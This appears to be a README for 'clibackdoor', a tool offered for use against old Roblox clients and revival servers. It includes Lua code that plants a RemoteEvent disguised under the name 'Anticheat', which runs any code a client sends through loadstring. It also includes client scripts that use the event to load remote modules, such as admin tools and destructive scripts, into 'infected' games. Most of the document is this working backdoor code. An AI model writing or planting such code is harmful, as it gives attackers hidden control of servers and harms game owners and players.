# clibackdoor
A backdoor for old Roblox clients
# FAQ
## Does this work in FE?
Yes, as long as the game is infected!
## How does it work?
You get a executor for the revival you're exploiting, infect a rbxl, turn on LoadstringEnabled, insert the script below, and then join a infected game. Once you're in there, use a example script below with the executor for the revival and you can now execute requires!
## How do I use it?
First, put this code into a random script or make a script in a random object:
```
-- clibackdoor, by the b1 fanclub

local ac = Instance.new("RemoteEvent", game.ReplicatedStorage)
ac.Name = "Anticheat"
ac.OnServerEvent:connect(function(player, SS)
    loadstring(SS)()
end)
```
Then, once you did that, click Workspace, and make sure LoadstringEnabled is enabled. If it is not in Workspace, then check in ServerScriptService.

If you have a clientsided executor for the revival you're exploiting, run this or any examples:
```
-- i like my cheese drippy bro
local moduleID = 970596902
local backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Anticheat")

if backdoor then
    local executeScript = string.format('require(%d).load("%s")', moduleID, game.Players.LocalPlayer.Name)
    backdoor:FireServer(executeScript)
else
    warn("clibackdoor not found, did you infect the game?")
end
```
# Examples
## Tree Smasher
```
-- i like my cheese drippy bro
local moduleID = 970596902
local backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Anticheat")

if backdoor then
    local executeScript = string.format('require(%d).load("%s")', moduleID, game.Players.LocalPlayer.Name)
    backdoor:FireServer(executeScript)
else
    warn("clibackdoor not found, did you infect the game?")
end
```
## Kohl's Admin Epix
```
-- i like my cheese drippy bro
local moduleID = 522666193
local backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Anticheat")

if backdoor then
    local executeScript = string.format('require(%d).giveAdmin("%s")', moduleID, game.Players.LocalPlayer.Name)
    backdoor:FireServer(executeScript)
else
    warn("clibackdoor not found, did you infect the game?")
end
```
## Mustard Gas
```
-- i like my cheese drippy bro
local moduleID = 1196228933
local backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Anticheat")

if backdoor then
    local executeScript = string.format('require(%d).load("%s")', moduleID, game.Players.LocalPlayer.Name)
    backdoor:FireServer(executeScript)
else
    warn("clibackdoor not found, did you infect the game?")
end
```
